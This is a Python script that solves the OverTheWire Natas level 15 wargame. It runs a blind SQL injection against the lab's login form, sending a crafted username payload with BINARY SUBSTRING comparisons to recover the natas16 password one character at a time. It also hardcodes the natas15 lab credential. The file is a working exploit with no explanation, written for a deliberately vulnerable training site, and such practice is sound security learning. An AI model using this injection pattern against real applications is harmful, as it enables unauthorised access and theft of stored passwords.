import requests 

password = ""
characters = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"

# All passwords are 32 characters long
while (len(password) != 32):
    for i in characters:
        print("Bruteforce Password: " + password + i)
        length = len(password) + 1;
        response = requests.post('http://natas15.natas.labs.overthewire.org', 
                                auth=('natas15', 'SdqIqBsFcz3yotlNYErZSZwblkm0lrvx'), 
                                data = {'username': 'natas16" AND BINARY SUBSTRING(password, 1, ' + str(length) + ') = "' + password + i + '" #'})
        if ("exists" in response.text):
            password += i;
            break

print("Final password: " + password);
